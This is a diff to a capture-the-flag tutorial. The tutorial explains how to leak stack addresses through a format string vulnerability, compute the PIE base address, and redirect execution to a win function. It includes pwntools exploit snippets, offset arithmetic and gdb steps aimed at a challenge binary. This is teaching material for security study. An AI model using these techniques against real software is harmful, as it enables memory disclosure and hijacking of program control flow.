@@ -8,7 +8,7 @@ Learn how to leak addresses using format string vulnerability. How to bypass PIE
 Looking for the piefect slice of PIE.
 
 ## Difficulty:
-Easy
+Medium
 
 ## Guide
 Let's look at the main part of the source code.
@@ -41,7 +41,7 @@ Secure example:
 printf("%s", input)
 ```
 
-vulnerable example:
+Vulnerable example:
 ```c
 print(input)
 ```
@@ -66,7 +66,7 @@ It stands for **Position Independent Code**. What happens is that, the **binary*
 ### What can we do??
 While PIE makes exploits inconvenient, there are workarounds. This is because PIE uses **relative addressing**. This means offsets between all instructions & functions of the binary are **fixed**.
 
-For example, if difference in offset between `main` function and `function1` function is 3, it will stay as 3 even with PIE enabled.
+For example, if difference in offset between `main` function and `function1` function is 3, it will stay as 3 even with PIE enabled. (In short, if I know where `main` is located, I just need to do `main+3` to locate `function1`)
 
 From a bigger perspective, it means if we can figure out the **base address**, we can still access any functions using offsets instead.
 
@@ -90,7 +90,11 @@ Here's a taste:
 0x7fe321bc6643
 ```
 
-This is only 1 address off the stack, but it is not enough. Let's build a script to show more values.
+We can see that it is an address that we manually leaked off the stack. 
+
+However, there are a lot of addresses on the stack, and we want to find one that is useful to us.
+
+Let's build a script to do just that.
 
 ```py
 from pwn import *
@@ -133,22 +137,23 @@ Address @13: 0x562a91e00a49
 ...
 ```
 
-You might be wondering: Which given addresses do we use?
+You might be wondering: Which given we see above addresses do we use?
 
-You can do this to check(run the binary first):
+You can do this to check (the binary must be running):
 ```sh
+# run this command if PIE is enabled
 pwndbg> piebase
 Calculated VA from <YOUR_DIR> = 0x555555400000
 ```
 
-We want to actually use the one that is in the `0x555555400000` range, thus the 13th value of the stack. (FYI those that start with `7f` are libc functions)
+We want to actually use the one that is in the `0x555555400000` range, thus the 13th value of the stack. (FYI those that start with `7ff` are libc functions)
 
 Run the following in gdb to check if it is an address in the binary:
 1. `break main`
 2. `run`
 3. `c` - continue
 4. `%13$p` - send input to get 13th address in the stack
-5. press `CTRL + c` to interrupt the program but keep it running
+5. press `CTRL + c` to interrupt the program but keep it running (the program MUST remain running to get addresses that can only be shown at runtime)
 5. `x <address>`
 
 ```sh
@@ -200,7 +205,7 @@ Leak the address first.
 ```py
 p = remote("SERVER", PORT)
 
-payload = b'%13$p'
+payload = b'%13$p' # leak the 13th address on stack
 p.sendlineafter("flavour: \n", payload)
 p.recvuntil("taste: \n")
 result = int(p.recvline(), 16)
@@ -210,8 +215,8 @@ print(result)
 calculate for address of `piefect` function.
 
 ```py
-piebase = result - 0xa49
-piefect_addr= piebase + 0x8ea # address of piefect function
+piebase = result - 0xa49 # calculate base address
+piefect_addr= piebase + 0x8ea # address of `piefect` function
 ```
 
 After `decision` is called, we will perform ret2win.
